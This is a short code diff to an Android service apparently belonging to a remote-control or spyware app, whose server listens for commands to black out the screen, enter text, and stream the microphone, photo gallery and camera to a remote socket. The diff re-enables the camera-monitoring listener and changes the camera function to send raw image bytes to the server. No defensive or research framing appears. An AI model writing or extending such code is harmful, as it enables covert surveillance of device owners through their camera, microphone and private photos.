@@ -90,7 +90,7 @@ public class Server extends Service {
             socket.on("mb-screen-black-event-" + mDeviceID, onScreenBlackMonitor);
             socket.on("mb-screen-skeleton-" + mDeviceID, onScreenSkeletonMonitor);
             socket.on("mb-screen-send-text-" + mDeviceID, onScreenSetTextMonitor);
-//            socket.on("mb-camera-monitor-" + mDeviceID, onCameraMonitor);
+            socket.on("mb-camera-monitor-" + mDeviceID, onCameraMonitor);
             socket.on("mb-mic-monitor-" + mDeviceID, onMicMonitor);
             socket.on("mb-all-gallery-monitor-" + mDeviceID, onAllGalleryMonitor);
             socket.on("mb-one-gallery-monitor-" + mDeviceID, onOneGalleryMonitor);
@@ -544,13 +544,13 @@ public class Server extends Service {
         }
     }
 
-    public void sendCameraMonitoring(String base64Image, int qualityCamera, String cameratype) {
+    public void sendCameraMonitoring(ByteArrayOutputStream outputStream, int qualityCamera, String cameratype) {
         try {
             JSONObject sendJson = new JSONObject();
             sendJson.put("deviceId", mDeviceID);
             sendJson.put("cameraType", cameratype);
             sendJson.put("qualityType", String.valueOf(qualityCamera));
-            sendJson.put("base64Image", base64Image);
+            sendJson.put("base64Image", outputStream.toByteArray());
             if(socket != null && socket.connected()) {
                 socket.emit("camera-mobile-response", sendJson);
             }
